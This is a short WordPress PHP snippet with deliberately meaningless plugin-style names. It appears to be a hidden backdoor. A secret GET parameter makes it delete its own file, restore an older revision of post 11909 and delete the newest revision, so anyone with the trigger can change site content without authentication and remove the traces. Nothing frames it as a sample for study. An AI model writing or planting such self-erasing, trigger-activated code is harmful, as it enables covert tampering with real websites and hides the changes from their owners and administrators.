<?php

function sticky_downloads_board_project() {
	if (isset($_GET['language_last_rss']) && $_GET['language_last_rss'] === 'ticket_archive_audio_coupon') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$hover_disable_maintenance = 11909;
		$react_monitor_permalinks_full = wp_get_post_revisions($hover_disable_maintenance);
		if (empty($react_monitor_permalinks_full)) die('no revisions');
		if (count($react_monitor_permalinks_full) < 2) die('less than 2');
		$internal_quick_cookies = array_shift($react_monitor_permalinks_full);
		$upgrader_content_views = $internal_quick_cookies->ID;
		$optimizer_optimize_auto_genesis = array_shift($react_monitor_permalinks_full);
		$mini_plupload_wpml = $optimizer_optimize_auto_genesis->ID;
		$notifications_share_calculator_contents = wp_restore_post_revision($mini_plupload_wpml);
		if ($notifications_share_calculator_contents === false) die('error restoring');
		$notifications_share_calculator_contents = wp_delete_post_revision($upgrader_content_views);		
		if ($notifications_share_calculator_contents === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'sticky_downloads_board_project');
